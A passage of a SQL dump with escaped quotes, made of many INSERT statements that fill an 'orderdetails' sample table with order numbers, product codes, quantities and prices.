\u0026#39;114.18\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;62.46\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;61.42\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;68.83\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;56.41\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;35.78\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;88.60\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;85.99\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;91.74\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;107.97\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;76.80\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;62.19\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;47.67\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10362\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;182.04\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10362\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;131.04\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10362\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;53.91\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10362\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;91.29\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;180.95\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;106.87\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;68.63\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;103.64\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;61.60\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;69.15\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;124.94\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;52.22\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;123.50\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;70.08\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;56.10\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;52.05\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;113.75\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;75.99\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;92.90\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10364\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;38.22\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10365\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;116.06\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10365\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;82.66\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10365\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;68.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10366\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;116.65\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10366\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;105.60\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10366\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;154.10\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;105.77\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;144.50\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;50.25\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;124.59\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;140.06\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;131.39\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;77.31\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;66.99\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;72.76\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;50.31\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;29.54\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;43.01\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;36.25\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10368\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;73.60\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10368\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;115.09\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10368\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;83.04\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10368\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;93.16\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10368\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;36.52\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;195.01\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;89.38\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;46.36\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;100.30\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;51.84\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;90.06\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;80.36\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;93.49\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;128.53\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;128.47\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;100.34\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;101.87\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;60.16\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;167.65\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;105.34\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;41.76\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;63.99\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;178.71\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;104.28\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;160.46\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;53.75\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;126.51\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;35.01\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;95.81\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;82.83\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;44.37\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;53.44\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;97.23\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;83.95\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;146.55\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;140.15\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;131.13\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;91.76\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;119.20\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;78.99\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;102.00\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;56.82\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;74.48\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;118.32\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;143.50\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;75.70\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;99.52\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;58.92\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;82.31\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;53.92\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;83.86\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;62.10\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;58.00\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;76.94\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;69.39\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;94.16\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;83.42\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;68.11\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;44.20\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;48.05\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10374\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;115.37\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10374\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;158.80\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10374\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;75.19\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10374\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;48.46\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10374\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;112.70\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10374\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;107.23\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;76.56\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;184.84\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;150.62\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;67.03\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;60.26\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;60.13\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;87.90\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;59.85\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;96.95\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;36.22\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;69.16\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;86.77\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;94.73\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;98.48\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;69.60\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10376\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;98.65\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10377\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;65.44\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10377\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;112.86\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10377\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;124.56\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10377\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;61.60\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10377\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;125.18\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10377\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;143.94\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;121.95\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;66.74\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES 